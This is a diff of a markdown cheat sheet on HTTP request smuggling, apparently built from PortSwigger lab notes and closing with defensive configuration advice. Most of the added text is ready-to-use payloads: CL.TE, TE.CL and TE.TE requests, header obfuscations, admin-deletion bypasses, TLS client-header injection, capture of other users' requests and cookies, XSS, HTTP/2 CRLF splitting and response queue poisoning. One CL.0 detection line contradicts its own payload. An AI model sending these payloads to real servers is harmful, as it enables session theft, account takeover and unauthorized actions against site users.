@@ -1,332 +1,498 @@
-	
-Users send requests to a front end server and this server forwards requests to one or more back-end servers.  when the front end server forwards HTTP requests to a back end server 
-it typically sends requests  into the same back end  as for HTTP requests they are send one after the another and the receiving server determine where the requests ends in 
+tactic: Multiple
 
-the whole idea is that the attacker causes part of their front end request to be interpreted by the back-end as the start of the next request 
-
-HTTP 1.1 Struct
-``` HTTP 
-POST /login HTTP/1.1\r\n   
-Host: psres.net\r\n   
-User-Agent: burp\r\n   
-Content-Length: 9\r\n
-\r\n  
-x=123&y=4
-```
-
-HTTP/2
-```HTTP
-
-:method POST
-:path /login 
-:authority psres.net
-:scheme https
-user-agent burp
-x=123&y=4
+**HTTP Request Smuggling** exploits disagreements between how a front-end and back-end server determine where one HTTP request ends and the next begins. The attacker smuggles a hidden prefix into the back-end's buffer that gets prepended to the next legitimate user's request — causing the back-end to process a malformed, attacker-controlled request on behalf of another user.
 
 ```
+Normal flow:
+Client → Front-end → Back-end
+[Request 1][Request 2][Request 3]   ← clean boundaries
 
-
-HTTP/2 is a binary protocol like TCP, 
-
-
-##### Message length 
-
-`HTTP/1` length of each message body is indicated via content length or Transfer encoding header
-`HTTP/2` those headers are redundant each message body is composed of data frames hence we apply downgrading 
-
-
-
-
-
-### Downgrading 
-HTTP/2  is when a front-end server speaks HTTP/2 with clients  but rewrites  requests into HTTP/1.1 before forwarding them on to the back end server.
-
-
-Classic smuggling vulnerabilities mostly occur because the front-end and the back-end disagree about  whether to take the request's Content-Length or Transfer-Encoding header. 
-
-Depending on which way around this desynch happens the vulnerability is classified as CL.TE or TE.CL
-
-
-Classic request smuggling vulnerabilities mostly occur because the front-end and the back-end  disagree about whether to derive a request's length from CL or TE 
-
-
-
-### Core concept :
-
-- HTTP/1.1  sends multiple http request over single TCP 
-- HTTP simply place back to back 
-- HTTP/1.1 specifies 2 different way to specify where requests end: 1- content-length , Transfer-Encoding 
--  gives the attacker the ability to prepend arbitrary content at the start of the next user request 
--  the first part of the request is forwarded to the backend 
-- when the second part request arrives it ends up appended onto the 1.5 something like letter G will result in GPOST
-
-
-In chunked contents the message is terminated with a chunked size 0 
-```HTTP
-Content-Length: 6  
-Transfer-Encoding: chunked      
-0      
-GPOST / HTTP/1.1   
-Host: example.com
+Smuggled flow:
+Client → Front-end → Back-end
+[Request 1 + prefix][Request 2]
+Back-end sees: [Request 1][prefix + Request 2]  ← poisoned
 ```
 
+HTTP/1.1 allows two ways to specify request length — the conflict between them is the vulnerability:
 
-the smuggled content will be referred to as the 'prefix'
+```
+Content-Length (CL)       → explicit byte count
+Transfer-Encoding (TE)    → chunked, terminated with size 0 chunk
+```
 
-## vulns
+When front-end and back-end disagree on which to trust, the attacker controls where requests are split.
 
-the vuln arise
-1) content length header -> es since the http/1  specification provides 2 different ways :`Content-Length: INT`
-2) Transfer-Encoding -> `Transfer-Encoding: chunked`
+---
 
-when these 2 headers are present the Content-Length should be ignored 
+## Vulnerability Types
 
+|Type|Front-end uses|Back-end uses|
+|---|---|---|
+|CL.TE|Content-Length|Transfer-Encoding|
+|TE.CL|Transfer-Encoding|Content-Length|
+|TE.TE|Transfer-Encoding|Transfer-Encoding (obfuscated)|
+|H2.CL|HTTP/2|HTTP/1 Content-Length|
+|H2.TE|HTTP/2|HTTP/1 Transfer-Encoding|
+|CL.0|Content-Length|Ignores body (treats as 0)|
 
-the behavior of the attack:
-- **CL.TE**  front end server uses the `Content Length` and the back end uses `transfer-encoding` 
-	How does it work the front end processes the CE and determines that the request body is 13 bytes this request is forwarded on the back end server
+---
 
-	the backend server processes the TE header and treats the message body as using chunked encoding.  hence if it is stated as  0  in request body meaning is it 0 stated length , the rest of the request will be left unprocessed and the back end server will treat these as being the start of the next request in the sequence
+## Chunked Encoding Reference
 
+```http
+Transfer-Encoding: chunked
 
-	
+5\r\n          ← chunk size in hex
+HELLO\r\n      ← chunk data
+0\r\n          ← terminating chunk (size 0)
+\r\n           ← end of chunked body
+```
 
-- **TE.CL**  font end server use TE header and back-end uses the CL
-	the front end server uses the TE header and the back end server uses the CE 
-	so the front end processes the TE and treats the message body as using chunked  encoding.   processes the first chunk which could be like this 
-	`8 smuggled 0`  ,  it processes the second chunk which is stated to be 0 length and treated as terminating the request  
+**Important: always include `\r\n\r\n` after the final `0` in TE.CL payloads.**
 
-	the back-end processes the CE that is 3 byte long  up to the start of the line following 8 bytes
+---
 
+## TE Header Obfuscation (TE.TE Bypass)
 
+One server processes TE, the other ignores it due to malformed syntax:
 
-- **TE.TE** from and back support TE one of the servers can be induced to not process it by obfuscating the header 
-
-The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal),
-
-
-Potential obfuscation 
-```http 
-
+```http
 Transfer-Encoding: xchunked
-Transfer-Encoding : chunked 
-Transfer-Encoding: chunked 
-Transfer-Encoding: x 
-Transfer-Encoding:[tab]chunked 
-[space]Transfer-Encoding: chunked 
-X: X[\n]Transfer-Encoding: chunked 
 Transfer-Encoding : chunked
-
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding : chunked
 ```
 
+---
 
+## Checklist
 
-## Detection
+### Detection — Time Delay
 
+**CL.TE detection** — short CL, front-end forwards only the CL bytes, back-end waits for next chunk indefinitely:
 
-The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present. This technique is used by Burp Scanner to automate the detection of request smuggling vulnerabilities.
-
-#### CL. TE 
-
-``` HTTP
-
+```http
 POST /about HTTP/1.1
-Host: example.com 
-Transfer-Encoding: chunked   
+Host: target.com
 Content-Length: 4
+Transfer-Encoding: chunked
+
 1
 Z
 Q
-
 ```
-short Content-Length, the front end will forward 1 , z  the back end will time out while waiting for the next chunk size. This will cause an observable time delay. 
- 
-#### TE.CL
 
-```HTTP
-POST /about HTTP/1.1   
-Host: example.com   
-Transfer-Encoding: chunked   
-Content-Length: 6      
-0      
+If response takes ~10 seconds → CL.TE confirmed
+
+**TE.CL detection** — front-end sends `0` chunk, back-end waits for remaining CL bytes:
+
+```http
+POST /about HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
 X
 ```
 
-terminating '0' chunk the front-end will only forward 0  and the back end will time out waiting for the X to arrive 
+If response times out → TE.CL confirmed
 
+### Detection — Differential Response (Confirmation)
 
-## Confirm
+**CL.TE confirm** — smuggle a prefix that causes 404 on the next request:
+```http
+POST / HTTP/1.1
+Content-Length: 38
+Transfer-Encoding: chunked
 
+3
+x=y
+0
 
-If the first request causes an error the back-end server may decide to close the connection, discarding the poisoned buffer and breaking the attack. Try to avoid this by targeting an endpoint that is designed to accept a POST request,
-
-Confirming the vuln consist of :
-
-- An "attack" request that is designed to interfere with the processing of the next request.
-- A "normal" request.
-
-If the response to the normal request contains the expected attachment , then the vulnerability is confirmed
-
-
-## Exploit 
-
-example  on how would request smuggling bypass front-end security , suppose an application uses the front-end server to implement access control restrictions, only forwarding requests if the user is authorized to access the requested URL and the backend doesn't check . like calling `\home` but not `\admin`
-
-
-#### By passion Client Authentication
-
-in TLS some times it requires to perform a form of mutual TLS authentication where clients are asked to present a certificate to the server where the common name is often username or something like that  which can be used in the back-end application logic as a part of an access control mechanism.
-
-the component that authenticates the client typically passes the relevant  details  from the certificate to the application or back-end server via one or more standard HTTP headers.
-
-```
-`X-SSL-CLIENT-CN: carlos`
+GET /404 HTTP/1.1
+Foo: x
 ```
 
-his behavior isn't usually exploitable because front-end servers tend to overwrite these headers if they're already present. However, smuggled requests are hidden from the front-end
+Follow immediately with a normal `GET /` — if you get a 404 → confirmed.
 
+**TE.CL confirm:**
 
+```http
+POST / HTTP/1.1
+Content-length: 4
+Transfer-Encoding: chunked
 
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
 
+x=1
+0
+```
 
-### Notes
--  the `attack` request and the `normal` request should be sent to the server using different network connections.
-- Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work
-- In some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail.
+Send a normal follow-up — 404 response confirms TE.CL.
 
-## Revealing front-end request Rewriting
+### Important Notes
 
-- terminate the TLS connection and add some headers describing the protocol and ciphers that were used
-- add `X-Forward-For` header containing the user's IP address
+- Send attack and normal requests over **different** network connections
+- Use the **same URL and parameters** so both hit the same back-end server
+- In load-balanced environments, if attack and normal go to different servers the attack fails
+- Target endpoints that accept POST to avoid connection resets from errors
 
-In some situations, if your smuggled requests are missing some headers that are normally added by the front-end server, then the back-end server might not process the requests in the normal way, resulting in smuggled requests failing to have the intended effects.
+---
 
-There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:
+## Classic Attacks
 
-- Find a POST request that reflects the value of a request parameter into the application's response.
-- Shuffle the parameters so that the reflected parameter appears last in the message body.
-- Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.
+### CL.TE — Basic
 
-## Using HTTP request smuggling to exploit reflected XSS
-if the application is vulnerable to XSS and HTTP smuggling we can use it to hit other users of the APP this give us an advantage of:
-- it requires no interaction with victim users. don't need to feed them a URL and wait for them to visit it. You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
-- It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.
-check the LAB
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
 
+0
 
-# HTTP/2 request smuggling
+G
+```
 
-HTTP/2 downgrading is the process of rewriting the request using HTTP/1 syntax to generate an equivalent `HTTP/1` request  Web servers and reverse proxies often do this in order to offer HTTP/2 support to clients while communicating with back-end servers that only speak HTTP/1.
-### message length
+Next user's request gets `G` prepended → `GPOST / HTTP/1.1` → 405 error confirms smuggling.
 
-fundamentally about exploitation different servers is interpreting the length of a request robust mechanism for doing this
+### TE.CL — Basic
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
 
-HTTP/2  messages are sent over the wire as a series of separate "frames".  each frame is preceded by an explicit length field  which tells the server exactly how many bytes to read in.
+56
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
 
-#### H2.CL 
+0
+```
 
-during downgrading, this means front-end add an `HTTP/1` `Content-Length` header  front-end servers will simply reuse this value in the resulting HTTP/1 request.
+### TE.TE — Obfuscated
+```http
+POST / HTTP/1.1
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x
 
-CL 0
-``` HTTP
-Content-Length: 0
-GET /admin HTTP/1.1
-Host: vulnerable-website.com 
+97
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+
+x=1
+0
+```
+
+---
+
+## Exploitation
+
+### Bypass Front-End Access Controls (CL.TE)
+
+```http
+POST / HTTP/1.1
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
 Content-Length: 10
+
+x=
 ```
 
+### Bypass Front-End Access Controls (TE.CL)
 
-#### H2.TE
+```http
+POST / HTTP/1.1
+Content-length: 4
+Transfer-Encoding: chunked
 
-chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any `transfer-encoding: chunked` header you try to inject should be stripped or the request blocked entirely
+87
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
 
-downgrades the request for an HTTP/1 back-end that does support chunked encoding
+x=1
+0
+```
 
+**Hex size rule for TE.CL:** count bytes from after the size line to before the terminator `0`.
 
-TE 0
+### Reveal Front-End Request Rewriting
 
-```HTTP
+The front-end adds headers (IP, TLS info, custom auth headers) that aren't visible. To discover them:
 
-POST /example HTTP/1.1 
-Host: vulnerable-website.com 
-Content-Type: application/x-www-form-urlencoded 
-Transfer-Encoding: chunked 
-0 
+1. Find a POST endpoint that reflects a parameter in the response
+2. Smuggle a request that reflects the next user's request into a comment/search field
+3. Set the `Content-Length` large enough to capture the appended headers
+
+```http
+POST / HTTP/1.1
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=YOUR_SESSION
+Content-Length: 600
+
+csrf=TOKEN&postId=9&name=a&email=a@a.com&website=http://a.com&comment=
+```
+
+The next request's headers get appended to `comment=` and stored — revealing the custom front-end headers like `X-Custom-IP: 127.0.0.1`.
+
+### Bypass Client Authentication via TLS Header Injection
+
+```http
+POST / HTTP/1.1
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
 GET /admin HTTP/1.1
-Host: vulnerable-website.com 
-Foo: bar
+X-SSL-CLIENT-CN: administrator
+Content-Length: 10
+
+x=
 ```
 
+The front-end strips these headers from normal requests but not from smuggled ones since they bypass the front-end entirely.
 
-### Request smuggling via CRLF injection
+### Capture Other Users' Requests (Cookie Theft)
 
- HTTP/1, you can sometimes exploit discrepancies between how servers handle standalone newline (`\n`) characters to smuggle prohibited headers. If the back-end treats this as a delimiter, but the front-end server does not, some front-end servers will fail to detect the second header at all.
+Smuggle a prefix that captures the next victim's full request into your comment:
 
-`Foo: bar\nTransfer-Encoding: chunked`
+```http
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 268
 
-This discrepancy doesn't exist with the handling of a full CRLF (`\r\n`) sequence because all HTTP/1 servers agree that this terminates the header.
+0
 
-HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, ***predetermined offsets*** rather than delimiter characters.
-This means that `\r\n` no longer has any special significance within a header value and, therefore, can be included **inside** the value itself without causing the header to be split
+POST /post/comment HTTP/1.1
+Cookie: session=YOUR_SESSION
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 950
 
-## HTTP/2 request splitting
-
-he split occurred inside the message body, but when HTTP/2 downgrading is in play, you can also cause this split to occur in the headers instead.
-
-This approach is more versatile because you aren't dependent on using request methods that are allowed to contain a body
-```HTTP
-:method GET  
-:path /
-:authority vulnerable-website.com
-foo bar\r\n \r\n GET /admin HTTP/1.1\r\n Host: vulnerable-website.com|
-```
-useful in cases where the `content-length` is validated and the back-end doesn't support chunked encoding.
-
-
-back-end contain a `Host` header. Front-end servers typically strip the `:authority` pseudo-header and replace it with a new HTTP/1 `Host` header during downgrading. There are different approaches for doing this, which can influence where you need to position the `Host` header
- During rewriting, some front-end servers append the new `Host` header to the end of the current list of headers.
-```
-|   |   |
-|---|---|
-|:method|GET|
-|:path|/|
-|:authority|vulnerable-website.com|
-|foo|bar\r\n Host: vulnerable-website.com\r\n \r\n GET /admin HTTP/1.1|
+csrf=TOKEN&postId=4&name=a&email=a@a.com&website=https://a.com&comment=test
 ```
 
-## Response queue poisoning 
+Increase `Content-Length` to capture more of the victim's request. Check the comment — it will contain their full request headers including cookies.
 
-- causes a front end server to start mapping responses from the back-end to the wrong request
+### XSS via Request Smuggling
 
+If the app reflects a header value without sanitization (e.g. User-Agent):
 
-### Note
-- Send the request. When the front-end server appends `\r\n\r\n` to the end of the headers during downgrading, this effectively converts the smuggled prefix into a complete request, poisoning the response queue.
+```http
+POST / HTTP/1.1
+Content-Length: 150
+Transfer-Encoding: chunked
 
-# Browser-powered request smuggling 
+0
 
-#### CL.0 request smuggling
+GET /post?postId=3 HTTP/1.1
+User-Agent: "><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
 
-back-end sometimes ignores he `Content-length` meaning ignoring the body of incoming request this paves the way for request smuggling attacks that don't rely on chunked transfer encoding or HTTP/2 downgrading 
-
-In some instances, servers can be persuaded to ignore the `Content-Length` header, meaning they assume that each request finishes at the end of the headers. This is effectively the same as treating the `Content-Length` as `0`.
-
-#### Testing for CL.0 vulnerabilities
-
-first request containing partial request in its body, then send a normal follow-up request. 
-follow-up request for the home page has received a 404 response
-This strongly suggests that the back-end server interpreted the body of the `POST` request (`GET /hopefully404...`) as the start of another request.
-
-`POST /vulnerable-endpoint HTTP/1.1 Host: vulnerable-website.com Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 34 GET /hopefully404 HTTP/1.1 Foo: xGET / HTTP/1.1 Host: vulnerable-website.com` `HTTP/1.1 200 OK HTTP/1.1 404 Not Found`
-
-
-```d
-TE.CL and CL.TE // classic request smuggling 
-H2.CL and H2.TE // HTTP/2 downgrade smuggling  
-CL.0 // this
-H2.0 // implied by CL.0  
-0.CL and 0.TE // unexploitable without pipelining
+x=
 ```
+
+The next user to visit `/post?postId=3` gets the XSS fired — no interaction needed from the attacker.
+
+## HTTP/2 Smuggling
+
+HTTP/2 uses binary frames with explicit lengths — no CL/TE ambiguity natively. But **downgrading** to HTTP/1 re-introduces the vulnerability.
+
+### H2.CL — Content-Length 0 Smuggling
+
+```http
+POST / HTTP/2
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /resources/js HTTP/1.1
+Host: exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+
+### H2.TE — Transfer-Encoding in HTTP/2
+
+```http
+POST / HTTP/2
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+```
+
+### CRLF Injection in HTTP/2 Headers
+
+In HTTP/2, `\r\n` inside a header value is not a delimiter — it gets passed through and interpreted as a header separator by HTTP/1 back-end during downgrading:
+
+```
+FOO: bar\r\n
+Transfer-Encoding: chunked
+```
+
+In Burp's inspector, add the header value with a literal CRLF:
+
+```
+Name: FOO
+Value: 1\r\nTransfer-Encoding: chunked
+```
+
+```http
+POST / HTTP/2
+FOO: 1\r\nTransfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1000
+
+search=prefix
+```
+
+### HTTP/2 Request Splitting via CRLF
+
+Inject a complete second request into a header value — more versatile than body-based smuggling:
+
+```
+Name: foo
+Value: bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
+```
+
+### Response Queue Poisoning (H2.TE)
+
+Sends a complete smuggled request that poisons the response queue — subsequent users receive each other's responses:
+
+```http
+POST /anything HTTP/2
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: target.com
+Cookie: session=VICTIM_SESSION
+```
+
+---
+
+## CL.0 Smuggling (Browser-Powered)
+
+The back-end ignores the `Content-Length` header for certain endpoints — effectively treating CL as 0. No chunked encoding or HTTP/2 needed.
+
+**Setup:**
+
+1. Create two tabs in a Burp Repeater group
+2. Tab 1: attack request (keep-alive)
+3. Tab 2: normal follow-up request
+4. Send group in sequence (single connection)
+5. Change `Connection: keep-alive`
+
+http
+
+```http
+POST /resources/images/blog.svg HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: 50
+
+GET /admin/delete?username=carlos HTTP/1.1
+Foo: x
+```
+
+**Detection:** if the follow-up request returns 404 (from the smuggled `GET /hopefully404`) → CL.0 confirmed.
+
+---
+
+## White Box Testing
+
+**Vulnerable, front-end trusts CL, back-end trusts TE — classic CL.TE:**
+
+```java
+// Nginx (front-end) — configured to use Content-Length for routing
+// Tomcat (back-end) — processes Transfer-Encoding: chunked
+// This mismatch is a configuration issue, not a single code fix
+// Most common in reverse proxy setups without explicit header normalization
+
+// Nginx config — missing header normalization
+// proxy_pass http://backend;
+// (no proxy_set_header to strip/normalize conflicting length headers)
+```
+
+**Vulnerable, HTTP/2 downgrading without stripping injected headers:**
+
+```java
+// Back-end receives downgraded HTTP/1 request with attacker-injected TE header
+// Front-end should strip Transfer-Encoding and Content-Length from HTTP/2 requests
+// before forwarding — many do not
+
+// HAProxy config — missing header sanitization during downgrade
+// No h2-to-h1 header stripping configured
+```
+
+**Secure configuration principles:**
+
+```
+1. Use HTTP/2 end-to-end where possible — eliminates CL/TE ambiguity
+2. Normalize ambiguous requests at the front-end:
+   - Reject requests with both CL and TE headers
+   - Strip TE headers before forwarding if not needed by back-end
+3. Configure the back-end to reject ambiguous requests rather than guess
+4. Use consistent server software on front-end and back-end — reduces parsing differences
+5. Enable Burp Scanner's HTTP smuggling detection in CI/CD pipelines
+
+# Nginx — reject ambiguous requests
+# merge_slashes off;
+# Add to server block:
+# if ($http_transfer_encoding ~* "chunked") {
+#     return 400;  # reject chunked on endpoints that don't need it
+# }
+
+# Apache — normalize CL/TE conflicts
+# Require consistent header handling via mod_security rules
+```
+
+---
+
 # LABS
 
 
@@ -636,7 +802,7 @@ search=h
 ```
 
 
-# HTTP/2 request splitting via CRLF injection
+ **HTTP/2 request splitting via CRLF injection**
 
 place the path to something unknown so when we have a different response we know the attack is successful 
 
@@ -647,7 +813,7 @@ GET /admin HTTP/1.1
 Host: 0a6a006704dc93fa816e757e00920095.web-security-academy.net
 ```
 
-# Response queue poisoning via H2.TE request smuggling
+**Response queue poisoning via H2.TE request smuggling**
 
 
 ```HTTP
@@ -668,7 +834,7 @@ Cookie: session=DYxY8jvCkquDbEGqhJXbJWQUTihBrVqd
 ```
 
 
-# CL.0 request smuggling
+ **CL.0 request smuggling**
 
 add 2 requests in the  one which is normal request and the second which contain the smuggled  send them over the same connection and keep the smuggled request  as keep-alive 
 
@@ -693,3 +859,11 @@ Content-Length: 50
 GET /admin/delete?username=carlos HTTP/1.1
 Foo: x
 ```
+
+
+## Resources
+
+- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
+- [PortSwigger HTTP/2 Smuggling](https://portswigger.net/web-security/request-smuggling/advanced)
+- [James Kettle HTTP/2 Research](https://portswigger.net/research/http2)
+- [HackTricks Request Smuggling](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling)
